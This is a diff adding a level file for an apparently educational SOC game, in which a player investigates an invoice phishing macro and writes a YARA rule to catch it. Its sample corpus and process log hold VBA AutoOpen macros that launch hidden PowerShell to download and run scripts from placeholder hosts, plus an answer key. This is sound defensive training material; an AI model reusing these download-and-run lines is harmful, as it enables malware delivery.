@@ -1,0 +1,186 @@
+{
+  "id": "1-invoice",
+  "number": 1,
+  "time": "21:30",
+  "title": {"en": "The Invoice", "fr": "La facture"},
+
+  "alert": {
+    "id": "SOC-2113",
+    "severity": "medium",
+    "source": "MAIL-GW",
+    "host": "WS-042",
+    "summary": {
+      "en": "Attachment with macros delivered to 3 mailboxes in Finance. One user opened it.",
+      "fr": "Pièce jointe avec macros livrée dans 3 boîtes du service Finance. Un utilisateur l'a ouverte."
+    }
+  },
+
+  "rulezy": {
+    "intro": {
+      "en": [
+        "Evening. I'm Rulezy, your night-shift partner. Mara said it would be quiet.",
+        "It isn't. Finance got an 'overdue invoice' with macros, and j.keller opened it on WS-042.",
+        "Read the mail, look at the file, check what WS-042 did after. Pin what matters — click it, it goes on the board.",
+        "Then we write a YARA rule that catches this document. And only this kind of document: Finance gets a lot of real invoices."
+      ],
+      "fr": [
+        "Bonsoir. Je suis Rulezy, ton binôme de nuit. Mara a dit que ce serait calme.",
+        "Raté. La Finance a reçu une « facture en retard » avec des macros, et j.keller l'a ouverte sur WS-042.",
+        "Lis le mail, regarde le fichier, vérifie ce que WS-042 a fait ensuite. Épingle ce qui compte — un clic, et ça part sur le tableau.",
+        "Ensuite on écrit une règle YARA qui attrape ce document. Et seulement ce genre de document : la Finance reçoit beaucoup de vraies factures."
+      ]
+    },
+    "hints": [
+      {
+        "en": "A macro that runs by itself has to start somewhere. Look at the first line of the invoice's macro — then look for that line in the other documents.",
+        "fr": "Une macro qui se lance toute seule doit bien démarrer quelque part. Regarde la première ligne de la macro de la facture — puis cherche cette ligne dans les autres documents."
+      },
+      {
+        "en": "AutoOpen alone is not enough: HR's timesheet template uses it too. What does the invoice do that the timesheet never does? WS-042's process log tells you.",
+        "fr": "AutoOpen seul ne suffit pas : le modèle de feuille de temps des RH l'utilise aussi. Que fait la facture que la feuille de temps ne fait jamais ? Le journal des processus de WS-042 te le dit."
+      },
+      {
+        "en": "Use $a = \"AutoOpen\" and $b = \"DownloadString\", and require both. IT's setup.ps1 downloads things too — but it has no macro.",
+        "fr": "Prends $a = \"AutoOpen\" et $b = \"DownloadString\", et exige les deux. Le setup.ps1 de l'IT télécharge aussi — mais il n'a pas de macro."
+      }
+    ],
+    "lines": {
+      "pin_first": {"en": "Good. Everything on the board stays there. Keep digging.", "fr": "Bien. Tout ce qui est sur le tableau y reste. Continue."},
+      "need_evidence": {"en": "Not yet. Show me the file and what it did on WS-042 before you write anything.", "fr": "Pas encore. Montre-moi le fichier et ce qu'il a fait sur WS-042 avant d'écrire quoi que ce soit."},
+      "syntax": {"en": "YARA refused to compile that. Look at the error, it's usually honest.", "fr": "YARA refuse de compiler ça. Regarde l'erreur, elle est souvent honnête."},
+      "fp": {"en": "Your rule fired on a harmless file. At 3 a.m. that's a pager going off for nothing. Make it more specific.", "fr": "Ta règle s'est déclenchée sur un fichier inoffensif. À 3 h du matin, c'est un bip pour rien. Rends-la plus précise."},
+      "fn": {"en": "It missed a malicious copy. The attacker only needs one to get through.", "fr": "Elle rate une copie malveillante. Il suffit d'une seule pour que l'attaquant passe."},
+      "ok": {"en": "Every invoice caught, nothing else. That one can go to production.", "fr": "Toutes les factures attrapées, rien d'autre. Celle-là peut partir en production."},
+      "deploy_fail": {"en": "Deployed with a problem — the pager storm starts. Fix it and deploy again.", "fr": "Déployée avec un souci — la tempête de bips commence. Corrige et redéploie."},
+      "closed": {"en": "Case closed. And look — a fourth invoice just hit the gateway, a new domain. Your rule caught it anyway. Mara's 'quiet night' is off to a great start.", "fr": "Affaire classée. Et regarde — une quatrième facture vient d'arriver, avec un nouveau domaine. Ta règle l'a quand même attrapée. La « nuit calme » de Mara commence fort."},
+      "closed_missed_variant": {"en": "Case closed. But a fourth invoice just hit the gateway from a new domain — and your rule let it through. Pinning the domain was too narrow; next time, catch what the attacker can't change easily.", "fr": "Affaire classée. Mais une quatrième facture vient d'arriver d'un nouveau domaine — et ta règle l'a laissée passer. Le domaine, c'était trop étroit ; la prochaine fois, attrape ce que l'attaquant ne peut pas changer facilement."},
+      "printer": {"en": "That printer again. Mara said to ignore it.", "fr": "Encore cette imprimante. Mara a dit de l'ignorer."}
+    }
+  },
+
+  "tools": {
+    "mail": [
+      {
+        "key": "mail:invoice",
+        "from": "billing@glasshouse-logistics.example",
+        "to": "j.keller@corp.example; a.romero@corp.example; t.nguyen@corp.example",
+        "time": "21:12",
+        "subject": "Invoice 0923 — OVERDUE, second reminder",
+        "attachment": "invoice_0923.docm",
+        "body": "Dear customer,\n\nOur records show invoice 0923 is still unpaid. Please open the attached document and enable content to view the payment details.\n\nLate fees apply after 48h.\n\nBilling department"
+      },
+      {
+        "key": "mail:timesheet",
+        "from": "hr@corp.example",
+        "to": "all-staff@corp.example",
+        "time": "17:40",
+        "subject": "October timesheets",
+        "attachment": "Timesheet_template.docm",
+        "body": "Hi all,\n\nThe October timesheet template is attached. Enable macros when you open it — it fills in your name and the month for you.\n\nThanks,\nHR"
+      },
+      {
+        "key": "mail:mara",
+        "from": "m.duval@corp.example",
+        "to": "soc-night@corp.example",
+        "time": "20:58",
+        "subject": "handover",
+        "body": "Quiet day. The new EDR is noisy, ignore the printer on the 3rd floor (PRN-3F-01), it's been doing that all week.\n\nCoffee is fresh. Good luck.\n— Mara"
+      }
+    ],
+
+    "files": [
+      {
+        "key": "file:invoice_0923.docm",
+        "name": "invoice_0923.docm",
+        "origin": "WS-042 — Outlook attachment cache",
+        "sample": "mal-1"
+      },
+      {
+        "key": "file:Timesheet_template.docm",
+        "name": "Timesheet_template.docm",
+        "origin": "\\\\fileshare\\HR\\templates",
+        "sample": "ben-1"
+      },
+      {
+        "key": "file:setup.ps1",
+        "name": "setup.ps1",
+        "origin": "\\\\fileshare\\IT\\deploy",
+        "sample": "ben-2"
+      },
+      {
+        "key": "file:invoice_0923.pdf",
+        "name": "invoice_0923.pdf",
+        "origin": "\\\\fileshare\\Finance\\suppliers\\Nordwind",
+        "sample": "ben-3"
+      }
+    ],
+
+    "logs": [
+      {"key": "log:mail-delivered", "time": "21:12:04", "host": "MAIL-GW", "source": "mail-gw", "text": "delivered msg-id=<7f3a@glasshouse-logistics.example> attachment=invoice_0923.docm (macro: yes) rcpt=3"},
+      {"key": "log:dns-printer-1", "time": "21:14:00", "host": "PRN-3F-01", "source": "dns", "text": "query A upd.prn-firmware.example -> 203.0.113.77", "side": "printer"},
+      {"key": "log:outlook-open", "time": "21:24:51", "host": "WS-042", "source": "sysmon", "text": "EventID=11 FileCreate OUTLOOK.EXE -> C:\\Users\\j.keller\\AppData\\Local\\Microsoft\\Windows\\INetCache\\Content.Outlook\\invoice_0923.docm"},
+      {"key": "log:word-start", "time": "21:24:53", "host": "WS-042", "source": "sysmon", "text": "EventID=1 ProcessCreate WINWORD.EXE parent=OUTLOOK.EXE cmd=\"WINWORD.EXE /n invoice_0923.docm\""},
+      {"key": "log:dns-printer-2", "time": "21:15:00", "host": "PRN-3F-01", "source": "dns", "text": "query A upd.prn-firmware.example -> 203.0.113.77", "side": "printer"},
+      {"key": "log:proc-powershell", "time": "21:25:09", "host": "WS-042", "source": "sysmon", "text": "EventID=1 ProcessCreate powershell.exe parent=WINWORD.EXE cmd=\"powershell -w hidden -nop -c IEX (New-Object Net.WebClient).DownloadString('http://cdn-invoice-portal.example/inv.ps1')\""},
+      {"key": "log:dns-cdn", "time": "21:25:10", "host": "WS-042", "source": "dns", "text": "query A cdn-invoice-portal.example -> 198.51.100.23"},
+      {"key": "log:proxy-get", "time": "21:25:10", "host": "PROXY-01", "source": "proxy", "text": "WS-042 GET http://cdn-invoice-portal.example/inv.ps1 200 4812 bytes (uncategorized)"},
+      {"key": "log:av-none", "time": "21:25:12", "host": "WS-042", "source": "edr", "text": "scan invoice_0923.docm: no detection"},
+      {"key": "log:hr-template", "time": "18:02:33", "host": "WS-017", "source": "sysmon", "text": "EventID=1 ProcessCreate WINWORD.EXE parent=explorer.exe cmd=\"WINWORD.EXE Timesheet_template.docm\""},
+      {"key": "log:it-setup", "time": "19:40:12", "host": "SRV-DEPLOY", "source": "sysmon", "text": "EventID=1 ProcessCreate powershell.exe parent=svc-deploy cmd=\"powershell -nop -File \\\\fileshare\\IT\\deploy\\setup.ps1\""},
+      {"key": "log:dns-printer-3", "time": "21:16:00", "host": "PRN-3F-01", "source": "dns", "text": "query A upd.prn-firmware.example -> 203.0.113.77", "side": "printer"}
+    ]
+  },
+
+  "evidence": {
+    "required": ["file:invoice_0923.docm", "log:proc-powershell"],
+    "bonus": ["mail:invoice", "log:dns-cdn", "log:proxy-get", "string:mal-1:DownloadString", "string:mal-1:AutoOpen"],
+    "side": ["log:dns-printer-1", "log:dns-printer-2", "log:dns-printer-3"]
+  },
+
+  "rule": {
+    "format": "yara",
+    "mode": "blanks",
+    "name": "Glasshouse_Invoice_Macro",
+    "conditions": ["$a", "$b", "$a and $b", "$a or $b", "any of them", "all of them"],
+    "reference": {"a": "AutoOpen", "b": "DownloadString", "condition": "$a and $b"}
+  },
+
+  "corpus": {
+    "malicious": [
+      {
+        "id": "mal-1",
+        "name": "invoice_0923.docm",
+        "value": "PK word/vbaProject.bin\nAttribute VB_Name = \"ThisDocument\"\nSub AutoOpen()\n    Dim s As String\n    s = \"pow\" & \"ershell -w hidden -nop -c \"\n    s = s & \"IEX (New-Object Net.WebClient).DownloadString('http://cdn-invoice-portal.example/inv.ps1')\"\n    Shell s, vbHide\nEnd Sub\nInvoice 0923 - Glasshouse Logistics - amount due 4,812.00 EUR"
+      },
+      {
+        "id": "mal-2",
+        "name": "invoice_0923 (a.romero).docm",
+        "value": "PK word/vbaProject.bin\nAttribute VB_Name = \"ThisDocument\"\nSub AutoOpen()\n    Dim s As String\n    s = \"pow\" & \"ershell -w hidden -nop -c \"\n    s = s & \"IEX (New-Object Net.WebClient).DownloadString('http://cdn-invoice-portal.example/inv2.ps1')\"\n    Shell s, vbHide\nEnd Sub\nInvoice 0923 - Glasshouse Logistics - amount due 4,812.00 EUR"
+      }
+    ],
+    "benign": [
+      {
+        "id": "ben-1",
+        "name": "Timesheet_template.docm",
+        "value": "PK word/vbaProject.bin\nAttribute VB_Name = \"ThisDocument\"\nSub AutoOpen()\n    ActiveDocument.Bookmarks(\"Name\").Range.Text = Application.UserName\n    ActiveDocument.Bookmarks(\"Month\").Range.Text = Format(Date, \"mmmm yyyy\")\n    MsgBox \"Timesheet ready\"\nEnd Sub\nCorp HR - monthly timesheet"
+      },
+      {
+        "id": "ben-2",
+        "name": "setup.ps1",
+        "value": "# IT deploy script - installs the standard toolset on new workstations\n$ErrorActionPreference = 'Stop'\n$src = 'https://intranet.corp.example/tools/install.ps1'\nIEX (New-Object Net.WebClient).DownloadString($src)\nInstall-CorpTools -Profile Standard\nWrite-Host 'done'"
+      },
+      {
+        "id": "ben-3",
+        "name": "invoice_0923.pdf",
+        "value": "%PDF-1.7\nNordwind Supplies GmbH\nInvoice 0923\nPayment terms: 30 days\nTotal due: 1,240.00 EUR\nIBAN DE89 3704 0044 0532 0130 00\n%%EOF"
+      }
+    ],
+    "hidden_variants": [
+      {
+        "id": "var-1",
+        "name": "invoice_1002.docm",
+        "value": "PK word/vbaProject.bin\nAttribute VB_Name = \"ThisDocument\"\nSub AutoOpen()\n    Dim u As String, s As String\n    u = \"http://billing-docs-cdn.example/p.ps1\"\n    s = \"pow\" & \"ershell -w hidden -nop -c IEX (New-Object Net.WebClient).DownloadString('\" & u & \"')\"\n    Shell s, vbHide\nEnd Sub\nInvoice 1002 - Glasshouse Logistics - amount due 9,120.00 EUR"
+      }
+    ]
+  }
+}
